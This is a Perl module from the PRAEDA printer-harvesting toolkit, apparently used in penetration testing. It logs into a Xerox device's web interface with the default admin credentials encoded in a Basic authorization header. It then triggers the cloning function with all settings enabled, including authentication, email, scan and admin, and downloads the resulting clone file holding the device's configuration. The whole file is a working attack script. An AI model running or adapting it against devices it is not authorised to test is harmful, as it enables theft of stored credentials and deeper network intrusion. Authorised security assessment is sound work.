# Xerox clone Download
######################################################
#                    PRAEDA Module #MP0008           #
#        Copyright (C) 2010 Foofus.net		     #
#              Deral 'percX' Heiland   		     #
#		modified 11/07/2011 percx            #
######################################################
package MP0008;
sub MP0008
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my @PATH = ("properties/xerox.set", "dummypost/xerox.set");
my @clone = ("cloning.dlm", "download/cloning.dlm");

#Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting Clone Download Xerox  $TARGET : JOB MP0008**********\n";
     print OUTFILE "\n**********Attempting Clone Download Xerox $TARGET : JOB MP0008**********\n";

# Download of Job Account Record
my $browser = LWP::UserAgent->new(timeout => 120);
$browser->default_header(Authorization=> "Basic YWRtaW46MTExMQ==");

my $response;
foreach $path (@PATH)
{
  print "Attempting clone request to $path: ";
  $response = $browser->post("http$web://$TARGET:$PORTS/$path",
  [
  "_fun_function" => "HTTP_Config_Cloning_fn",
  "NextPage" => "/properties/cloning.dhtml",
  "enableCon" => "1",
  "enableTemp" => "1",
  "enableDevice" => "1",
  "enableAuth" => "1",
  "enableEmail" => "1",
  "enableScan" => "1",
  "enableAdmin" => "1",
  ]);

  if ($response->is_success) { print "\n"; break; }
  else { print "FAILED - " .  $response->code . " : " . $response->message . "\n"; }
}

#print $response->title;

# checking multiple paths for clone file
if ( $response->title == "Cloning" )
     {
      foreach $clone (@clone)
       {
        my $cloning = $browser->get("http$web://$TARGET:$PORTS/$clone");
        if ($cloning->header("Title") == "404 Not Found") { print "Could not find $clone on $TARGET:$PORTS/$clone attempting other paths\n"; }
	elsif ($cloning->header("Title") == "403 Forbidden") { print "Basic authentication failed - 403 Forbidden on $TARGET:$PORTS\n"; }
        else {
                open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-cloning.dlm") || die("Failed to open  Output file $TARGET-$PORTS-cloning.dlm \n");
        	print JOBACCTOUTFILE $cloning->content;
        	print "***Found clone at $TARGET:$PORTS/$clone, Downloading to $TARGET-$PORTS-cloning.dlm ***\n";
        	print OUTFILE "*** Found clone at $TARGET:$PORTS/$clone, Downloading to $TARGET-$PORTS-cloning.dlm ***\n";
             }                          
	          
       }
      

# operation completed close out output files
close(JOBACCTOUTFILE);
     }

else
     {

print "Cloning post failed";
     }

close(OUTFILE);
}
1;
